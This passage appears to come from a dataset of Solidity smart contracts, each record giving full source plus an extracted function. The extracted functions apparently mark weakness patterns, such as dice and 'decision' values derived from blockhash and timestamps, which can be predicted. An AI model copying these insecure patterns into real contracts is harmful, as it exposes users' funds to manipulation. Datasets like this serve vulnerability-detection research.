LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\n setMaxProfit();\n playerRolls[target] = playerRoll(uint200(0), uint48(0), uint8(0));\n ZTHTKN.transfer(target, profit + roll.tokenValue);\n return result;\n } else {\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\n contractBalance = contractBalance.add(roll.tokenValue);\n playerRolls[target] = playerRoll(uint200(0), uint48(0), uint8(0));\n setMaxProfit();\n return result;\n }\n }\n struct TKN {address sender; uint value;}\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool) {\n require(msg.sender == ZTHTKNADDR);\n if (_from == ZethrBankroll) {\n contractBalance = contractBalance.add(_value);\n uint oldMaxProfit = maxProfit;\n setMaxProfit();\n emit MaxProfitChanged(oldMaxProfit, maxProfit);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n uint8 chosenNumber = uint8(_data[0]);\n _playerRollDice(chosenNumber, _tkn);\n }\n return true;\n }\n function setMaxProfit() internal {\n emit CurrentContractBalance(contractBalance);\n maxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function ownerUpdateContractBalance(uint newContractBalance) public\n onlyOwner\n {\n contractBalance = newContractBalance;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n require(newMaxProfitAsPercent <= 200000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferZTH(address sendTo, uint amount) public\n onlyOwner\n {\n contractBalance = contractBalance.sub(amount);\n setMaxProfit();\n require(ZTHTKN.transfer(sendTo, amount));\n emit LogOwnerTransfer(sendTo, amount);\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerSetBankroll(address newBankroll) public\n onlyOwner\n {\n ZTHTKN.approve(ZethrBankroll, 0);\n ZethrBankroll = newBankroll;\n ZTHTKN.approve(newBankroll, MAX_INT);\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function dumpdivs() public{\n ZethrBankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _finishBet(bool delete_it, address target) private returns (uint){\nplayerRoll memory roll = playerRolls[target];\nrequire(roll.tokenValue > 0);\nrequire(roll.blockn != block.number);\nuint result;\nif (block.number - roll.blockn > 255) {\nresult = 1000;\n} else {\nresult = random(99, roll.blockn, target) + 1;\n}\nuint rollUnder = roll.rollUnder;\nif (result < rollUnder) {\nuint profit = calculateProfit(roll.tokenValue, rollUnder);\nif (profit > maxProfit){\nprofit = maxProfit;\n}\ncontractBalance = contractBalance.sub(profit);\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\nsetMaxProfit();\nplayerRolls[target] = playerRoll(uint200(0), uint48(0), uint8(0));\nZTHTKN.transfer(target, profit + roll.tokenValue);\nreturn result;\n} else {\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\ncontractBalance = contractBalance.add(roll.tokenValue);\nplayerRolls[target] = playerRoll(uint200(0), uint48(0), uint8(0));\nsetMaxProfit();\nreturn result;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b15"
  },
  "filename": "1165.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b16"
  },
  "filename": "1171.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Owned {\n address public owner;\n address internal newOwner;\n function Owned() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n event updateOwner(address _oldOwner, address _newOwner);\n function changeOwner(address _newOwner) public onlyOwner returns(bool) {\n require(owner != _newOwner);\n newOwner = _newOwner;\n return true;\n }\n function acceptNewOwner() public returns(bool) {\n require(msg.sender == newOwner);\n emit updateOwner(owner, newOwner);\n owner = newOwner;\n return true;\n }\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) pure internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeSub(uint a, uint b) pure internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) pure internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n}\ncontract ERC20Token {\n uint256 public totalSupply;\n mapping (address => uint256) public balances;\n function balanceOf(address _owner) constant public returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract PUST is ERC20Token {\n string public name = \"UST Put Option\";\n string public symbol = \"PUST\";\n uint public decimals = 0;\n uint256 public totalSupply = 0;\n uint256 public topTotalSupply = 0;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowances[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {\n return allowances[_owner][_spender];\n }\n mapping(address => uint256) public balances;\n mapping (address => mapping (address => uint256)) allowances;\n}\ncontract ExchangeUST is SafeMath, Owned, PUST {\n uint public ExerciseEndTime = 1546272000;\n uint public exchangeRate = 100000;\n address public ustAddress = address(0xFa55951f84Bfbe2E6F95aA74B58cc7047f9F0644);\n address public officialAddress = address(0x472fc5B96afDbD1ebC5Ae22Ea10bafe45225Bdc6);\n event Cancel(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s);\n event Deposit(address token, address user, uint amount, uint balance);\n event Withdraw(address token, address user, uint amount, uint balance);\n event exchange(address contractAddr, address reciverAddr, uint _pustBalance);\n event changeFeeAt(uint _exchangeRate);\n function chgExchangeRate(uint _exchangeRate) public onlyOwner {\n require (_exchangeRate != exchangeRate);\n require (_exchangeRate != 0);\n exchangeRate = _exchangeRate;\n }\n function exerciseOption(uint _pustBalance) public returns (bool) {\n require (now < ExerciseEndTime);\n require (_pustBalance <= balances[msg.sender]);\n uint _ether = _pustBalance * 10 ** 18;\n require (address(this).balance >= _ether);\n uint _amount = _pustBalance * exchangeRate * 10**18;\n require (PUST(ustAddress).transferFrom(msg.sender, officialAddress, _amount) == true);\n balances[msg.sender] = safeSub(balances[msg.sender], _pustBalance);\n totalSupply = safeSub(totalSupply, _pustBalance);\n msg.sender.transfer(_ether);\n emit exchange(address(this), msg.sender, _pustBalance);\n }\n}\ncontract USTputOption is ExchangeUST {\n uint public initBlockEpoch = 40;\n uint public eachUserWeight = 10;\n uint public initEachPUST = 5*10**17 wei;\n uint public lastEpochBlock = block.number + initBlockEpoch;\n uint public price1=4*9995*10**17/10000;\n uint public price2=99993 * 10**17/100000;\n uint public eachPUSTprice = initEachPUST;\n uint public lastEpochTX = 0;\n uint public epochLast = 0;\n address public lastCallAddress;\n uint public lastCallPUST;\n event buyPUST (address caller, uint PUST);\n function () payable public {\n require (now < ExerciseEndTime);\n require (topTotalSupply > totalSupply);\n bool firstCallReward = false;\n uint epochNow = whichEpoch(block.number);\n if(epochNow != epochLast) {\n lastEpochBlock = safeAdd(lastEpochBlock, ((block.number - lastEpochBlock)/initBlockEpoch + 1)* initBlockEpoch);\n doReward();\n eachPUSTprice = calcpustprice(epochNow, epochLast);\n epochLast = epochNow;\n firstCallReward = true;\n lastEpochTX = 0;\n }\n uint _value = msg.value;\n uint _PUST = _value / eachPUSTprice;\n require(_PUST > 0);\n if (safeAdd(totalSupply, _PUST) > topTotalSupply) {\n _PUST = safeSub(topTotalSupply, totalSupply);\n }\n uint _refound = _value - _PUST * eachPUSTprice;\n if(_refound > 0) {\n msg.sender.transfer(_refound);\n }\n balances[msg.sender] = safeAdd(balances[msg.sender], _PUST);\n totalSupply = safeAdd(totalSupply, _PUST);\n emit buyPUST(msg.sender, _PUST);\n if(lastCallAddress == address(0) && epochLast == 0) {\n firstCallReward = true;\n }\n if (firstCallReward) {\n uint _firstReward = 0;\n _firstReward = (_PUST - 1) * 2 / 10 + 1;\n if (safeAdd(totalSupply, _firstReward) > topTotalSupply) {\n _firstReward = safeSub(topTotalSupply,totalSupply);\n }\n balances[msg.sender] = safeAdd(balances[msg.sender], _firstReward);\n totalSupply = safeAdd(totalSupply, _firstReward);\n }\n lastEpochTX += 1;\n lastCallAddress = msg.sender;\n lastCallPUST = _PUST;\n lastEpochBlock = safeAdd(lastEpochBlock, eachUserWeight);\n }\n function whichEpoch(uint _blocknumber) internal view returns (uint _epochNow) {\n if (lastEpochBlock >= _blocknumber ) {\n _epochNow = epochLast;\n }\n else {\n _epochNow = epochLast + (_blocknumber - lastEpochBlock) / initBlockEpoch + 1;\n }\n }\n function calcpustprice(uint _epochNow, uint _epochLast) public returns (uint _eachPUSTprice) {\n require (_epochNow - _epochLast > 0);\n uint dif = _epochNow - _epochLast;\n uint dif100 = dif/100;\n dif = dif - dif100*100;\n for(uint i=0;i<dif100;i++)\n {\n price1 = price1-price1*5/100;\n price2 = price2-price2*7/1000;\n }\n price1 = price1 - price1*5*dif/10000;\n price2 = price2 - price2*7*dif/100000;\n _eachPUSTprice = price1+price2;\n }\n function doReward() internal returns (bool) {\n if (lastEpochTX == 1) return false;\n uint _lastReward = 0;\n if(lastCallPUST != 0) {\n _lastReward = (lastCallPUST-1) * 2 / 10 + 1;\n }\n if (safeAdd(totalSupply, _lastReward) > topTotalSupply) {\n _lastReward = safeSub(topTotalSupply,totalSupply);\n }\n balances[lastCallAddress] = safeAdd(balances[lastCallAddress], _lastReward);\n totalSupply = safeAdd(totalSupply, _lastReward);\n }\n function DepositETH() payable public {\n require (msg.sender == officialAddress);\n topTotalSupply += msg.value / 10**18;\n }\n function WithdrawETH() payable public onlyOwner {\n require (now >= ExerciseEndTime);\n officialAddress.transfer(address(this).balance);\n }\n function allocLastTxRewardByHand() public onlyOwner returns (bool success) {\n lastEpochBlock = safeAdd(block.number, initBlockEpoch);\n doReward();\n success = true;\n }\n}",
  "extract_feature": [
    "function allocLastTxRewardByHand() public onlyOwner returns (bool success) {\nlastEpochBlock = safeAdd(block.number, initBlockEpoch);\ndoReward();\nsuccess = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b17"
  },
  "filename": "1206.sol",
  "content": "pragma solidity ^0.4.20;\ncontract owned {\n address public owner;\n address public tokenContract;\n constructor() public{\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyOwnerAndtokenContract {\n require(msg.sender == owner || msg.sender == tokenContract);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function transfertokenContract(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n tokenContract = newOwner;\n }\n }\n}\ncontract DataContract is owned {\n struct Good {\n bytes32 preset;\n uint price;\n uint decision;\n uint time;\n }\n mapping (bytes32 => Good) public goods;\n function setGood(bytes32 _preset, uint _price,uint _decision) onlyOwnerAndtokenContract external {\n goods[_preset] = Good({preset: _preset, price: _price, decision:_decision, time: now});\n }\n function getGoodPreset(bytes32 _preset) view public returns (bytes32) {\n return goods[_preset].preset;\n }\n function getGoodDecision(bytes32 _preset) view public returns (uint) {\n return goods[_preset].decision;\n }\n function getGoodPrice(bytes32 _preset) view public returns (uint) {\n return goods[_preset].price;\n }\n}\ncontract Token is owned {\n DataContract DC;\n constructor(address _dataContractAddr) public{\n DC = DataContract(_dataContractAddr);\n }\n event Decision(uint decision,bytes32 preset);\n function postGood(bytes32 _preset, uint _price) onlyOwner public {\n require(DC.getGoodPreset(_preset) == \"\");\n uint _decision = uint(keccak256(keccak256(blockhash(block.number),_preset),now))%(_price);\n DC.setGood(_preset, _price, _decision);\n Decision(_decision, _preset);\n }\n}",
  "extract_feature": [
    "function postGood(bytes32 _preset, uint _price) onlyOwner public {\nrequire(DC.getGoodPreset(_preset) == \"\");\nuint _decision = uint(keccak256(keccak256(blockhash(block.number),_preset),now))%(_price);\nDC.setGood(_preset, _price, _decision);\nDecision(_decision, _preset);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b18"
  },
  "filename": "1224.sol",
  "content": "pragma solidity ^0.4.20;\ncontract owned {\n address public owner;\n address public tokenContract;\n constructor() public{\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyOwnerAndtokenContract {\n require(msg.sender == owner || msg.sender == tokenContract);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function transfertokenContract(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n tokenContract = newOwner;\n }\n }\n}\ncontract DataContract is owned {\n struct Good {\n bytes32 preset;\n uint price;\n uint decision;\n uint time;\n }\n mapping (bytes32 => Good) public goods;\n function setGood(bytes32 _preset, uint _price,uint _decision) onlyOwnerAndtokenContract external {\n goods[_preset] = Good({preset: _preset, price: _price, decision:_decision, time: now});\n }\n function getGoodPreset(bytes32 _preset) view public returns (bytes32) {\n return goods[_preset].preset;\n }\n function getGoodDecision(bytes32 _preset) view public returns (uint) {\n return goods[_preset].decision;\n }\n function getGoodPrice(bytes32 _preset) view public returns (uint) {\n return goods[_preset].price;\n }\n}\ncontract Token is owned {\n DataContract DC;\n constructor(address _dataContractAddr) public{\n DC = DataContract(_dataContractAddr);\n }\n event Decision(uint decision,bytes32 preset);\n function postGood(bytes32 _preset, uint _price) onlyOwner public {\n require(DC.getGoodPreset(_preset) == \"\");\n uint _decision = uint(keccak256(keccak256(blockhash(block.number),_preset),now))%(_price);\n DC.setGood(_preset, _price, _decision);\n Decision(_decision, _preset);\n }\n}",
  "extract_feature": [
    "function postGood(bytes32 _preset, uint _price) onlyOwner public {\nrequire(DC.getGoodPreset(_preset) == \"\");\nuint _decision = uint(keccak256(keccak256(blockhash(block.number),_preset),now))%(_price);\nDC.setGood(_preset, _price, _decision);\nDecision(_decision, _preset);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b19"
  },
  "filename": "1233.sol",
  "content": "pragma solidity 0.4.18;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary Math {\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract Whitelist is Ownable {\n mapping(address => bool) public whitelist;\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n modifier onlyWhitelisted() {\n require(whitelist[msg.sender]);\n _;\n }\n function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {\n if (!whitelist[addr]) {\n whitelist[addr] = true;\n WhitelistedAddressAdded(addr);\n success = true;\n }\n }\n function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (addAddressToWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {\n if (whitelist[addr]) {\n whitelist[addr] = false;\n WhitelistedAddressRemoved(addr);\n success = true;\n }\n }\n function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (removeAddressFromWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n}\ncontract Presale is Whitelist {\n using SafeMath for uint256;\n uint256 private weiRaised;\n uint256 private startTime;\n uint256 private endTime;\n uint256 private rate;\n uint256 private cap;\n function Presale(uint256 _startTime, uint256 duration, uint256 _rate, uint256 _cap) public {\n require(_rate > 0);\n require(_cap > 0);\n require(_startTime >= now);\n require(duration > 0);\n rate = _rate;\n cap = _cap;\n startTime = _startTime;\n endTime = startTime + duration * 1 days;\n weiRaised = 0;\n }\n function totalWei() public constant returns(uint256) {\n return weiRaised;\n }\n function capRemaining() public constant returns(uint256) {\n return cap.sub(weiRaised);\n }\n function totalCap() public constant returns(uint256) {\n return cap;\n }\n function buyTokens(address purchaser, uint256 value) internal returns(uint256) {\n require(validPurchase(value));\n uint256 tokens = rate.mul(value);\n weiRaised = weiRaised.add(value);\n return tokens;\n }\n function hasEnded() internal constant returns(bool) {\n return now > endTime || weiRaised >= cap;\n }\n function hasStarted() internal constant returns(bool) {\n return now > startTime;\n }\n function validPurchase(uint256 value) internal view returns (bool) {\n bool withinCap = weiRaised.add(value) <= cap;\n return withinCap && withinPeriod();\n }\n function presaleRate() public view returns(uint256) {\n return rate;\n }\n function withinPeriod () private constant returns(bool) {\n return now >= startTime && now <= endTime;\n }\n function increasePresaleEndTime(uint _days) public onlyWhitelisted {\n endTime = endTime + _days * 1 days;\n }\n function getPresaleEndTime() public constant returns(uint) {\n return endTime;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract CanReclaimToken is Ownable {\n using SafeERC20 for ERC20Basic;\n function reclaimToken(ERC20Basic token) external onlyOwner {\n uint256 balance = token.balanceOf(this);\n token.safeTransfer(owner, balance);\n }\n}\ncontract VestingTrustee is Ownable, CanReclaimToken {\n using SafeMath for uint256;\n ERC20 public token;\n struct Grant {\n uint256 value;\n uint256 start;\n uint256 cliff;\n uint256 end;\n uint256 installmentLength;\n uint256 transferred;\n bool revokable;\n uint256 prevested;\n uint256 vestingPercentage;\n }\n mapping (address => Grant) public grants;\n uint256 public totalVesting;\n event NewGrant(address indexed _from, address indexed _to, uint256 _value);\n event TokensUnlocked(address indexed _to, uint256 _value);\n event GrantRevoked(address indexed _holder, uint256 _refund);\n function VestingTrustee(address _token) {\n require(_token != address(0));\n token = ERC20(_token);\n }\n function grant(address _to, uint256 _value, uint256 _start, uint256 _cliff, uint256 _end,\n uint256 _installmentLength, uint256 vestingPercentage, uint256 prevested, bool _revokable)\n external onlyOwner {\n require(_to != address(0));\n require(_to != address(this));\n require(_value > 0);\n require(_value.sub(prevested) > 0);\n require(vestingPercentage > 0);\n require(grants[_to].value == 0);\n require(_start <= _cliff && _cliff <= _end);\n require(_installmentLength > 0 && _installmentLength <= _end.sub(_start));\n require(totalVesting.add(_value.sub(prevested)) <= token.balanceOf(address(this)));\n grants[_to] = Grant({\n value: _value,\n start: _start,\n cliff: _cliff,\n end: _end,\n installmentLength: _installmentLength,\n transferred: prevested,\n revokable: _revokable,\n prevested: prevested,\n vestingPercentage: vestingPercentage\n });\n totalVesting = totalVesting.add(_value.sub(prevested));\n NewGrant(msg.sender, _to, _value);\n }\n function revoke(address _holder) public onlyOwner {\n Grant memory grant = grants[_holder];\n require(grant.revokable);\n uint256 refund = grant.value.sub(grant.transferred);\n delete grants[_holder];\n totalVesting = totalVesting.sub(refund);\n token.transfer(msg.sender, refund);\n GrantRevoked(_holder, refund);\n }\n function vestedTokens(address _holder, uint256 _time) external constant returns (uint256) {\n Grant memory grant = grants[_holder];\n if (grant.value == 0) {\n return 0;\n }\n return calculateVestedTokens(grant, _time);\n }\n function calculateVestedTokens(Grant _grant, uint256 _time) private constant returns (uint256) {\n if (_time < _grant.cliff) {\n return _grant.prevested;\n }\n if (_time >= _grant.end) {\n return _grant.value;\n }\n uint256 installmentsPast = _time.sub(_grant.cliff).div(_grant.installmentLength) + 1;\n return _grant.prevested.add(_grant.value.mul(installmentsPast.mul(_grant.vestingPercentage)).div(100));\n }\n function unlockVestedTokens() external {\n Grant storage grant = grants[msg.sender];\n require(grant.value != 0);\n uint256 vested = calculateVestedTokens(grant, now);\n if (vested == 0) {\n revert();\n }\n uint256 transferable = vested.sub(grant.transferred);\n if (transferable == 0) {\n revert();\n }\n grant.transferred = grant.transferred.add(transferable);\n totalVesting = totalVesting.sub(transferable);\n token.transfer(msg.sender, transferable);\n TokensUnlocked(msg.sender, transferable);\n }\n function reclaimEther() external onlyOwner {\n assert(owner.send(this.balance));\n }\n}\ncontract Controlled {\n modifier onlyController { require(msg.sender == controller); _; }\n address public controller;\n function Controlled() public { controller = msg.sender;}\n function changeController(address _newController) public onlyController {\n controller = _newController;\n }\n}\ncontract TokenController {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public\n returns(bool);\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract MiniMeToken is Controlled {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'MMT_0.2';\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n MiniMeToken public parentToken;\n uint public parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n MiniMeTokenFactory public tokenFactory;\n function MiniMeToken(\n address _tokenFactory,\n address _parentToken,\n uint _parentSnapShotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public {\n tokenFactory = MiniMeTokenFactory(_tokenFactory);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n parentToken = MiniMeToken(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n transfersEnabled = _transfersEnabled;\n creationBlock = block.number;\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n doTransfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n if (msg.sender != controller) {\n require(transfersEnabled);\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n }\n doTransfer(_from, _to, _amount);\n return true;\n }\n function doTransfer(address _from, address _to, uint _amount\n ) internal {\n if (_amount == 0) {\n Transfer(_from, _to, _amount);\n return;\n }\n require(parentSnapShotBlock < block.number);\n require((_to != 0) && (_to != address(this)));\n var previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n 